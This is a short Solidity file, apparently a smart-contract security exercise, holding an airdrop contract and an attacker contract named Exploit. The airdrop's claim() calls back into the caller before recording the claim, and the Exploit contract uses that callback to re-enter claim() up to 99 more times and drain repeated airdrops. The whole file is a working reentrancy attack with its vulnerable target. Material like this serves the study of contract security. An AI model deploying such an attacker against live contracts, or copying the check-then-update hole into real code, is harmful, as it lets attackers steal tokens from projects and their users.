pragma solidity 0.8.19;

interface Contract {
    function canHandleAirdrop() external returns (bool);
}

contract IAirdrop {
    uint256 constant AMOUNT_PER_ADDRESS = 1e18;

    mapping(address => uint256) public claimed;

    modifier notClaimed {
        require(claimed[msg.sender] == 0, "address already claimed");
        _;
    }

    function claim() external notClaimed {
        if(msg.sender.code.length > 0) {
            require(Contract(msg.sender).canHandleAirdrop(), "contract cannot handle airdrop");
        }

        claimed[msg.sender] += AMOUNT_PER_ADDRESS;
    }
}

contract Exploit {
    IAirdrop iairdrop;
    uint256 num = 0;
    constructor(address airdropAddress) {
        iairdrop = IAirdrop(airdropAddress);
    }

    function attack() external {
        iairdrop.claim();
    }
    
    function canHandleAirdrop()external returns(bool) {
        if(num < 99)
        {
            num++;
            iairdrop.claim();
            return true;
        }
        return true;
    }
    
    
}